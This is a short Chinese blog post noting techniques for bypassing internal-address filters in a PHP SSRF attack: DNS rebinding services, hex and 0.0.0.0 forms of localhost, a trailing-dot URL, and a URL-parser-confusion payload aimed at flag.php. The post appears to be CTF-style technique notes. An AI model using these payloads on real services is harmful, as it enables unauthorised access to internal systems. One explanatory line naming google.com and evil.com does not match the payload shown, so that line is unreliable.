---
title: 记录一次SSRF绕过内网地址限制
date: 2019-06-22 00:39:31
categories: Web安全
tags: SSRF
---

记录一次php ssrf 绕过内网限制
<!--more-->
# 0x01 dns rebinding

多次访问刷新成功绕过
dns rebinding 利用地址 ：
https://lock.cmpxchg8b.com/rebinder.html
https://github.com/brannondorsey/whonow 

# 0x02 ip进制转换

```
→  ~ php -r 'echo gethostbyname("0x7f000001");'
0x7f000001#                                                                                       
→  ~ php -r 'echo ip2long("0x7f000001")>>24;'  
0#    
→  ~ ping -c1 0x7f000001
PING 0x7f000001 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.068 ms


--- 0x7f000001 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.068/0.068/0.068/0.000 ms

→  ~ ping -c1 0.0.0.0   
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.066 ms


--- 0.0.0.0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.066/0.066/0.066/0.000 ms
```

# 0x03 Enclosed alphanumerics 

网上别人的payload url=http://127.0.0.1./flag.php


# 0x04 url解析不一致

http://1:2@127.0.0.1:80%20@baidu.com/flag.php
parse_url 获得的地址是google.com, cURL 访问的是 evil.com
![](/image/php_ssrf.png)

参考文档:us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
